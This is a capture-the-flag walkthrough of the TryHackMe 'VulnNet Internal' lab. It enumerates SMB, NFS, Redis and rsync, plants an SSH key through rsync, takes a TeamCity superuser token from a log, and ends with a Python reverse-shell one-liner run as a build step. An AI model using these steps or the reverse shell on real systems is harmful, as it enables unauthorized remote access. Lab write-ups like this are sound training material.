# VulnNet Internal

Link to the room: https://tryhackme.com/room/vulnnetinternal

## Let's go!

Adding IP variable 

```
export IP=10.10.36.250
```

## Enumeration 

### Nmap

```
nmap -p22,139,111,445,873,2049,6379,35739,36817,41959,42019,42765 -sV -sC -T4 -Pn -oA 10.10.36.250 10.10.36.250
```

```
22/tcp    open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
111/tcp   open  rpcbind     2-4 
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
873/tcp   open  rsync       (protocol version 31)
2049/tcp  open  nfs_acl     3 (RPC #100227)
6379/tcp  open  redis       Redis key-value store
35739/tcp open  java-rmi    Java RMI
36817/tcp open  mountd      1-3 (RPC #100005)
41959/tcp open  mountd      1-3 (RPC #100005)
42019/tcp open  mountd      1-3 (RPC #100005)
42765/tcp open  nlockmgr    1-4 (RPC #100021)

Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Enum4linux

```
========================================= 
|    Share Enumeration on 10.10.36.250    |
 ========================================= 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        shares          Disk      VulnNet Business Shares
        IPC$            IPC       IPC Service (vulnnet-internal server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

### Smbclient 

```
smbclient //$IP/shares
```

No password is needed, and we're logged into as root. There are two directories present: 

```
  temp                                D        0  Sat Feb  6 11:45:10 2021
  data                                D        0  Tue Feb  2 09:27:33 2021
```

Downloading all files from both, we'll find the first flag in the file services.txt. Two more files are present in the data directory, which we'll download.

```
  data.txt                            N       48  Tue Feb  2 09:21:18 2021
  business-req.txt                    N      190  Tue Feb  2 09:27:33 2021
```

### NFS

```
showmount -e $IP
```

```
Export list for 10.10.36.250:
/opt/conf *
```

So we can see there is a directory conf inside /opt that might be of some interest. Let's create a folder /conf and mount it:

```
mount -t nfs $IP:/opt/conf conf
```

Browsing through the directories, hp contained some logs and /profile.d contained some scripts. Inside /redis/redis.conf we can find credentials.

```
requirepass "****************"
```

### Redis

In order to enumerate redis, there are two main ways of going about it. We can go the automatic route using a nmap script or metasploit:

```
nmap --script redis-info -sV -p 6379 $IP
msf> use auxiliary/scanner/redis/redis_server
```

And the manual enumeration using redis-cli. The tool can be installed using `sudo apt-get install redis-tools`

```
redis-cli -h $IP -a '****************'
```

A list of useful commands can be found at: https://redis.io/commands 
After playing around and through trial and error, I was finally able to locate the internal flag

```
10.10.36.250:6379> keys *
1) "int"
2) "marketlist"
3) "tmp"
4) "internal flag"
5) "authlist"
10.10.36.250:6379> get "internal flag"
```

Once again, after trying different commands, I was finally able to access the authlist.

```
10.10.36.250:6379> type authlist
list
10.10.36.250:6379> lrange authlist 1 100
1) "QXV0aG9yaXphd****************************************************************************************************3QFRXQEJjNzJ2Cg=="
```

## Decoding the cypher

From the look of it, we can tell that it's encoded in base64. Let's decode it.

```
echo -n "QXV0aG9yaXphd****************************************************************************************************3QFRXQEJjNzJ2Cg==" | base64 -d
```

```
Authorization for rsync://rsync-connect@127.0.0.1 with password **************
```

This leads us to rsync; again this is not at all surprising as we saw all these services running in our initial nmap scan.

### Enumerating rsync

A quick refresher using --help shows us the switches we need to use.

```
rsync -av --list-only rsync://$IP:873
```

```
files           Necessary home interaction
```

### Creating a folder and copying the files

```
rsync -av rsync://rsync-connect@$IP:873/files ./rsync
```

Browsing the directory, we can find user.txt. Other than that, there isn't anything useful here, except for the username. Now we can try to upload a public ssh key to the server and ssh into it.

```
ssh-keygen -f ./id_rsa
```

```
rsync -ahv ./id_rsa.pub rsync://rsync-connect@$IP:873/files/sys-internal/.ssh/authorized_keys --inplace --no-o --no-g
```

Now we can ssh into the machine using our key.

## Initial Foothold

```
ssh -i ./id_rsa sys-internal@$IP
```

### Checking for services

```
ss -tulwn
```

```
tcp     LISTEN    0         5                      127.0.0.1:631              0.0.0.0:*    
```

Let's get the socat binary from our host machine and forward the traffic from port 631 to port 8080 of the target machine so we can view it.

```
./socat tcp-l:8080,fork,reuseaddr tcp:127.0.0.1:631 
```
This didn't pan out; we get the error 'Bad request' - CUPS v2.2.7. 

## Java RMI

Let's enumerate this service which has been running on port 35739; we'll use metasploit for this. 

```
msf auxiliary(java_rmi_registry) > run
```

Again this shows that the application is not vulnerable to the exploit. So it looks like we'll have to go back to searching for another way in.

## Team City

We can see that there is a directory /TeamCity. This could be a path to privilege escalation.

```
bin          conf        licenses            TeamCity-readme.txt  webapps
BUILD_85899  devPackage  logs                temp                 work
buildAgent   lib         service.properties  Tomcat-running.txt
```

From TeamCity-readme.txt we can find that the service should be running on localhost:8111. Let's use our socat binary and forward the traffic to port 8080, so we can access it from the host machine.

```
./socat tcp-l:8080,fork,reuseaddr tcp:127.0.0.1:8111 &
```

Success! We have a landing page /login.html. Let's start looking for credentials before we brute force access. 

```
cat /TeamCity/logs/catalina.out
```

```
[TeamCity] Super user authentication token: ******************** (use empty username with the token as the password to access the server)
```

Now we have access as the superuser, and we can simply go create a new project > build configuration > build step and add a python script for getting a reverse shell.

```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")

```

```
root@vulnnet-internal:/TeamCity/buildAgent/work/2b35ac7e0452d98f# 
```
And there we go, we have successfully managed to get a reverse shell on the machine. Now we can go get the final flag.
